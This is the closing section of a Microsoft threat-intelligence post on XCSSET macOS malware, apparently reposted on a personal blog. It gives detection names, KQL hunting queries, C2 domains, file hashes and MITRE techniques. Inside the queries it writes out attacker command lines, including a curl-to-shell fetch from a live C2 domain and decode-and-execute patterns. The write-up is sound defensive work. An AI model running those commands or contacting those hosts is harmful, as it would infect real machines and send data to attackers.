<p>Customers with provisioned access can also use Microsoft Security Copilot in Microsoft Defender to investigate and respond to incidents, hunt for threats, and protect their organization with relevant threat intelligence.</p>
<h3 id="microsoft-defender-antivirus">Microsoft Defender Antivirus</h3>
<p>Microsoft Defender Antivirus detects this threat as the following malware:</p>
<ul>
<li>
<p>Trojan:MacOS/XCSSET.SC</p>
</li>
<li>
<p>Trojan:MacOS/XCSSET.SE</p>
</li>
<li>
<p>Trojan:MacOS/XCSSET.ST</p>
</li>
</ul>
<p>Defender Antivirus detects multiple sub-modules of this threat as the following:</p>
<ul>
<li>
<p>Trojan:MacOS/XCCSET.SE</p>
</li>
<li>
<p>Trojan:MacOS/XCCSET.SF</p>
</li>
<li>
<p>Trojan:MacOS/XCCSET.SG</p>
</li>
<li>
<p>Trojan:MacOS/XCCSET.SI</p>
</li>
<li>
<p>Trojan:MacOS/XCCSET.SJ</p>
</li>
</ul>
<p>Defender Antivirus also detects the following specific modules of this threat:</p>
<ul>
<li>
<p>Trojan:MacOS/XCCSET.SK – <em>dfhsebxzod</em></p>
</li>
<li>
<p>Trojan:MacOS/XCCSET.SH – <em>fpzfcieoci</em></p>
</li>
<li>
<p>Trojan:MacOS/XCCSET.SD – <em>hfdieiz</em></p>
</li>
</ul>
<h3 id="microsoft-defender-for-endpoint">Microsoft Defender for Endpoint</h3>
<p>The following Microsoft Defender for Endpoint alerts can indicate associated threat activity:</p>
<ul>
<li>Possible XCSSET activity</li>
</ul>
<p>The following alerts might also indicate threat activity related to this threat. Note, however, that these alerts can be also triggered by unrelated threat activity:</p>
<ul>
<li>
<p>Suspicious script launched</p>
</li>
<li>
<p>System information discovery</p>
</li>
<li>
<p>Network connection by osascript</p>
</li>
<li>
<p>Possible content exfiltration</p>
</li>
<li>
<p>Suspicious file or content ingress</p>
</li>
</ul>
<h2 id="hunting-queries">Hunting queries</h2>
<h3 id="microsoft-defender-xdr">Microsoft Defender XDR</h3>
<p>Microsoft Defender XDR customers can run the following queries to find related activity in their networks:</p>
<p><strong>Suspicious commands while building an Xcode project</strong></p>
<p>Search for suspicious commands related to this threat when an Xcode project is being built.</p>
<pre tabindex="0"><code>DeviceProcessEvents 
| where ProcessCommandLine has_all(&#34;echo&#34;, &#34;xxd -p -r&#34;, &#34;| sh&#34;) or ProcessCommandLine has_all(&#34;echo&#34;, &#34;base64 -d&#34;, &#34;| sh&#34;)
| where InitiatingProcessFileName has_any (&#34;sh&#34;, &#34;bash&#34;, &#34;zsh&#34;) 
| where InitiatingProcessCommandLine contains &#34;/Developer/Xcode/DerivedData&#34;
</code></pre><p><strong>Suspicious payload patterns</strong></p>
<p>Search for suspicious payload patterns related to this threat.</p>
<pre tabindex="0"><code>DeviceProcessEvents 
| where ProcessCommandLine has_all(&#34;echo&#34;, &#34;xxd -p -r&#34;, &#34;| sh&#34;) or ProcessCommandLine has_all(&#34;echo&#34;, &#34;base64 -d&#34;, &#34;| sh&#34;) 
| where InitiatingProcessFileName has_any (&#34;sh&#34;, &#34;bash&#34;, &#34;zsh&#34;)
</code></pre><h3 id="microsoft-sentinel">Microsoft Sentinel </h3>
<p>Microsoft Sentinel customers can use the TI Mapping analytics (a series of analytics all prefixed with ‘TI map’) to automatically match the malicious domain indicators mentioned in this blog post with data in their workspace. If the TI Map analytics are not currently deployed, customers can install the Threat Intelligence solution from the Microsoft Sentinel Content Hub to have the analytics rule deployed in their Sentinel workspace. </p>
<p>Search for command lines making first contact to C2 server or for command lines stopping Xcode, Terminal, or Finder applications:</p>
<pre tabindex="0"><code>union DeviceFileEvents, DeviceProcessEvents
  | where Timestamp &gt;= ago(90d)
  | where ProcessCommandLine contains &#39;curl -fskL -d &#34;https://bulknames.ru/a&#34; | sh &gt;/dev/null 2&gt;&amp;1 &amp;&#39;
  or ProcessCommandLine has &#34;ps aux | grep -E &#39;/Applications/(SimulatorTrampoline|Terminal|Finder).app&#39; | grep -v grep | awk &#39;{print $2}&#39; | xargs kill -9 &amp;/dev/null || true&#34;
</code></pre><p>Check for communications with network indicators of compromise (IOCs):</p>
<pre tabindex="0"><code>let c2cdomains = dynamic([&#34;bulknames.ru&#34;,&#34;castlenet.ru&#34;,&#34;chaoping.ru&#34;,&#34;devapple.ru&#34;,
&#34;gigacells.ru&#34;,&#34;gizmodoc.ru&#34;,&#34;trixmate.ru&#34;,&#34;itoyads.ru&#34;,&#34;rigglejoy.ru&#34;,&#34;rutornet.ru&#34;,
&#34;sigmate.ru&#34;,&#34;vivatads.ru&#34;,&#34;figmasol.ru&#34;]);
DeviceNetworkEvents
| where RemoteUrl in (c2cdomains)
| project TimeGenerated, DeviceId, DeviceName, Protocol, LocalIP, LocalIPType, LocalPort,RemoteIP, RemoteIPType, RemotePort, RemoteUrl
</code></pre><p>Check for infected file or script IOCs:</p>
<pre tabindex="0"><code>let selectedTimestamp = datetime(2025-01-01T00:00:00.0000000Z); 
let FileSHA256 = dynamic([&#34;d338dc9a75a14753f57399815b5d996a1c5e65aa4eb203222d8c85fb3d74b02f&#34;,&#34;56670f51f94080f1ae45f2a433767f210f290835bf582e1a2e1876f1028832de&#34;,” f67e2a27f0d1a4667b065ab05f884ff881eb7627e9d458f97f2204647b339c6e”
&#34;&#34;,&#34;25d226d5cb0c74ed5b1b85f12d53a4c2de2147ff464b2a35db03987015b11e24&#34;,
&#34;c2a7970216576a6b8f74528ffcfa51aa2b72b7f3e4237d97715b1b5ba80b25ca&#34;,&#34;8cec3c106659709017bb253becf68296c7bf13e76fa92b4450c281003d225645&#34;,
&#34;ea90c72e67f1c9a9231732119576a7dcb29471f7da428866187d4326e78097f2&#34;,&#34;ff83f53a383ba3f1d6b002006adf16a7f0b3263185d56cb70104889874d67c5d&#34;,&#34;cc37a01d3351b3c166f04aec6f52849e909b0b9c8d55095d730c660691b1ba66&#34;]); 
search in (AlertEvidence,BehaviorEntities,CommonSecurityLog,DeviceBaselineComplianceProfiles,DeviceEvents,DeviceFileEvents,DeviceImageLoadEvents, 
DeviceLogonEvents,DeviceNetworkEvents,DeviceProcessEvents,DeviceRegistryEvents,DeviceFileCertificateInfo,DynamicEventCollection,EmailAttachmentInfo,OfficeActivity,SecurityEvent,ThreatIntelligenceIndicator) 
TimeGenerated between ((selectedTimestamp - 1m) .. (selectedTimestamp + 90d)) // from January 1st runs the search for 90 days, change the selectedTimestamp above or 90d accordingly. 
and  
(SHA256 in (FileSHA256) or InitiatingProcessSHA256 in (FileSHA256))
</code></pre><h2 id="indicators-of-compromise">Indicators of compromise</h2>
<table>
  <thead>
      <tr>
          <th><strong>Indicator</strong></th>
          <th><strong>Type</strong></th>
          <th><strong>Description</strong></th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td><em>bulknames[.]ru</em></td>
          <td>Domain</td>
          <td>C2 server</td>
      </tr>
      <tr>
          <td><em>castlenet[.]ru</em></td>
          <td>Domain</td>
          <td>C2 server</td>
      </tr>
      <tr>
          <td><em>chaoping[.]ru</em></td>
          <td>Domain</td>
          <td>C2 server</td>
      </tr>
      <tr>
          <td><em>devapple[.]ru</em></td>
          <td>Domain</td>
          <td>C2 server</td>
      </tr>
      <tr>
          <td><em>gigacells[.]ru</em></td>
          <td>Domain</td>
          <td>C2 server</td>
      </tr>
      <tr>
          <td><em>gizmodoc[.]ru</em></td>
          <td>Domain</td>
          <td>C2 server</td>
      </tr>
      <tr>
          <td><em>trixmate[.]ru</em></td>
          <td>Domain</td>
          <td>C2 server</td>
      </tr>
      <tr>
          <td><em>itoyads[.]ru</em></td>
          <td>Domain</td>
          <td>C2 server</td>
      </tr>
      <tr>
          <td><em>rigglejoy[.]ru</em></td>
          <td>Domain</td>
          <td>C2 server</td>
      </tr>
      <tr>
          <td><em>rutornet[.]ru</em></td>
          <td>Domain</td>
          <td>C2 server</td>
      </tr>
      <tr>
          <td><em>sigmate[.]ru</em></td>
          <td>Domain</td>
          <td>C2 server</td>
      </tr>
      <tr>
          <td><em>vivatads[.]ru</em></td>
          <td>Domain</td>
          <td>C2 server</td>
      </tr>
      <tr>
          <td><em>figmasol[.]ru</em></td>
          <td>Domain</td>
          <td>C2 server</td>
      </tr>
      <tr>
          <td><em>~/Library/Caches/com.apple.finder</em></td>
          <td>File path</td>
          <td>A fake Launchpad application is created in this directory</td>
      </tr>
      <tr>
          <td><em>/Applications/SimulatorTrampoline.app</em></td>
          <td>File path</td>
          <td>Launcher application that runs additional modules found under the <em>finderModules</em> list</td>
      </tr>
      <tr>
          <td><em>/Applications/Reminders.app</em></td>
          <td>File path</td>
          <td>Fake Reminders application</td>
      </tr>
      <tr>
          <td><em>/Applications/Reminders.app/Notes/</em></td>
          <td>File path</td>
          <td>Directory where the malware stores the stolen notes from the Notes application</td>
      </tr>
      <tr>
          <td><em>/Applications/Terminal.app</em></td>
          <td>File path</td>
          <td>Launcher application that runs additional modules found under the <em>finderModules</em> list</td>
      </tr>
      <tr>
          <td><em>/Applications/Finder.app</em></td>
          <td>FIle path</td>
          <td>Launcher application that runs additional modules found under the <em>finderModules</em> list</td>
      </tr>
      <tr>
          <td>d338dc9a75a14753f57399815b5d996a1c5e65aa4eb203222d8c85fb3d74b02f</td>
          <td>SHA-256</td>
          <td><em>tmp/b</em> or <em>looz</em> (fourth-stage payload)</td>
      </tr>
      <tr>
          <td>56670f51f94080f1ae45f2a433767f210f290835bf582e1a2e1876f1028832de</td>
          <td>SHA-256</td>
          <td><em>/tmp/.n</em> (JavaScript payload)</td>
      </tr>
      <tr>
          <td>f67e2a27f0d1a4667b065ab05f884ff881eb7627e9d458f97f2204647b339c6e</td>
          <td>SHA-256</td>
          <td><em>dfhsebxzod</em> module (infects Xcode projects)  </td>
      </tr>
      <tr>
          <td>25d226d5cb0c74ed5b1b85f12d53a4c2de2147ff464b2a35db03987015b11e24</td>
          <td>SHA-256</td>
          <td><em>jez</em> module (establishes persistence through Git commits)</td>
      </tr>
      <tr>
          <td>c2a7970216576a6b8f74528ffcfa51aa2b72b7f3e4237d97715b1b5ba80b25ca</td>
          <td>SHA-256</td>
          <td><em>uhsoxtfd_vostfd</em> module (directory uploader)</td>
      </tr>
      <tr>
          <td>8cec3c106659709017bb253becf68296c7bf13e76fa92b4450c281003d225645</td>
          <td>SHA-256</td>
          <td><em>fpfb</em> module (directory listing)</td>
      </tr>
      <tr>
          <td>ea90c72e67f1c9a9231732119576a7dcb29471f7da428866187d4326e78097f2</td>
          <td>SHA-256</td>
          <td><em>vectfd</em> module (specific files exfiltration)</td>
      </tr>
      <tr>
          <td>ff83f53a383ba3f1d6b002006adf16a7f0b3263185d56cb70104889874d67c5d</td>
          <td>SHA-256</td>
          <td><em>p</em> (Dock persistence payload)</td>
      </tr>
      <tr>
          <td>cc37a01d3351b3c166f04aec6f52849e909b0b9c8d55095d730c660691b1ba66</td>
          <td>SHA-256</td>
          <td><em>.zshrc_aliases</em> file</td>
      </tr>
  </tbody>
</table>
<h2 id="mitre-attck-techniques-observed">MITRE ATT&amp;CK techniques observed</h2>
<table>
  <thead>
      <tr>
          <th><strong>Technique ID</strong></th>
          <th><strong>Technique name</strong></th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td>T1195.001</td>
          <td>Supply Chain Compromise: Compromise Software Dependencies and Development Tools</td>
      </tr>
      <tr>
          <td>T1059.002</td>
          <td>Command and Scripting Interpreter: AppleScript</td>
      </tr>
      <tr>
          <td>T1059.007</td>
          <td>Command and Scripting Interpreter: JavaScript</td>
      </tr>
      <tr>
          <td>T1059.004</td>
          <td>Command and Scripting Interpreter: Unix Shell</td>
      </tr>
      <tr>
          <td>T1546.004</td>
          <td>Event Triggered Execution: Unix Shell Configuration Modification</td>
      </tr>
      <tr>
          <td>T1560</td>
          <td>Archive Collected Data</td>
      </tr>
      <tr>
          <td>T1005</td>
          <td>Data from Local System</td>
      </tr>
      <tr>
          <td>T1041</td>
          <td>Exfiltration Over C2 Channel</td>
      </tr>
      <tr>
          <td>T1083</td>
          <td>File and Directory Discovery</td>
      </tr>
      <tr>
          <td>T1222.002</td>
          <td>File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification</td>
      </tr>
      <tr>
          <td>T1564.001</td>
          <td>Hide Artifacts: Hidden Files and Directories</td>
      </tr>
      <tr>
          <td>T1105</td>
          <td>Ingress Tool Transfer</td>
      </tr>
      <tr>
          <td>T1036.005</td>
          <td>Masquerading: Match Legitimate Name or Location</td>
      </tr>
      <tr>
          <td>T1647</td>
          <td>Plist File Modification</td>
      </tr>
      <tr>
          <td>T1518</td>
          <td>Software Discovery</td>
      </tr>
      <tr>
          <td>T1082</td>
          <td>System Information Discovery</td>
      </tr>
      <tr>
          <td>T1614.001</td>
          <td>System Location Discovery: System Language Discovery</td>
      </tr>
      <tr>
          <td>T1548.006</td>
          <td>Abuse Elevation Control Mechanism: TCC Manipulation</td>
      </tr>
      <tr>
          <td>T1140</td>
          <td>Deobfuscate/Decode Files or Information</td>
      </tr>
      <tr>
          <td>T1564.003</td>
          <td>Hide Artifacts: Hidden Window</td>
      </tr>
      <tr>
          <td>T1070.004</td>
          <td>Indicator Removal: File Deletion</td>
      </tr>
      <tr>
          <td>T1027.004</td>
          <td>Obfuscated Files or Information: Compile After Delivery</td>
      </tr>
      <tr>
          <td>T1027.013</td>
          <td>Obfuscated Files or Information: Encrypted/Encoded File</td>
      </tr>
      <tr>
          <td>T1217</td>
          <td>Browser Information Discovery</td>
      </tr>
      <tr>
          <td>T1518.001</td>
          <td>Software Discovery: Security Software Discovery</td>
      </tr>
      <tr>
          <td>T1033</td>
          <td>System Owner/User Discovery</td>
      </tr>
  </tbody>
</table>
<h2 id="references">References</h2>
<ul>
<li>
<p><a href="https://www.trendmicro.com/en">https://www.trendmicro.com/en</a>_us/research/20/h/xcsset-mac-malware–infects-xcode-projects–uses-0-days.html</p>
</li>
<li>
<p><a href="https://documents.trendmicro.com/assets/pdf/XCSSET">https://documents.trendmicro.com/assets/pdf/XCSSET</a>_Technical_Brief.pdf</p>
</li>
<li>
<p><a href="https://www.intego.com/mac-security-blog/mac-malware-exposed-xcsset-an-advanced-new-threat/">https://www.intego.com/mac-security-blog/mac-malware-exposed-xcsset-an-advanced-new-threat/</a></p>
</li>
<li>
<p><a href="https://www.jamf.com/blog/osx-xcsset-subverts-developer-environments/">https://www.jamf.com/blog/osx-xcsset-subverts-developer-environments/</a></p>
</li>
<li>
<p><a href="https://www.sentinelone.com/blog/xcsset-malware-update-macos-threat-actors-prepare-for-life-without-python/">https://www.sentinelone.com/blog/xcsset-malware-update-macos-threat-actors-prepare-for-life-without-python/</a></p>
</li>
</ul>
<h2 id="learn-more">Learn more</h2>
<p>For the latest security research from the Microsoft Threat Intelligence community, check out the Microsoft Threat Intelligence Blog: https://aka.ms/threatintelblog.</p>
<p>To get notified about new publications and to join discussions on social media, follow us on LinkedIn at <a href="https://www.linkedin.com/showcase/microsoft-threat-intelligence">https://www.linkedin.com/showcase/microsoft-threat-intelligence</a>, and on X (formerly Twitter) at https://x.com/MsftSecIntel.</p>
<p>To hear stories and insights from the Microsoft Threat Intelligence community about the ever-evolving threat landscape, listen to the Microsoft Threat Intelligence podcast: <a href="https://thecyberwire.com/podcasts/microsoft-threat-intelligence">https://thecyberwire.com/podcasts/microsoft-threat-intelligence</a>.</p>
<p>The post New XCSSET malware adds new obfuscation, persistence techniques to infect Xcode projects appeared first on Microsoft Security Blog.</p>
<p>Go to Source</p>

			</div>
		</article>
	</main>
<aside>
	<div>
		<div>
			<h3>LATEST POSTS</h3>
		</div>
		<div>
			<ul>
				
				<li><a href="/posts/2025-03-19-risky-bulletin-google-buys-wiz-for-32-b/">Risky Bulletin Google buys Wiz for 32 billion</a></li>
				
				<li><a href="/posts/apple-inc-sent-you-a-payment-request-payoneer-invoices-other-microsoft-enabled-scams/">“Apple Inc sent you a payment request” Payoneer invoices; other Microsoft-enabled scams</a></li>
				
				<li><a href="/posts/glasses-that-transcribe-text-to-audio/">“Glasses” That Transcribe Text To Audio</a></li>
				
				<li><a href="/posts/5-best-linux-centos-replacement-options-alternatives/">&lt;div&gt;5 Best Linux CentOS Replacement Options &amp; Alternatives&lt;/div&gt;</a></li>
				
				<li><a href="/posts/a-week-in-security-march-10-march-16/">&lt;div&gt;A week in security (March 10 – March 16)&lt;/div&gt;</a></li>
				
			</ul>
		</div>
	</div>
</aside>


	<footer>
	<p>&copy; 2025 <a href="https://ghariib.ir/"><b>Alireza Gharib. All right reserved</b></a>.
	<a href="https://github.com/Gharib110"><b>Github</b></a>.
	</p>
</footer>

</body>
</html>
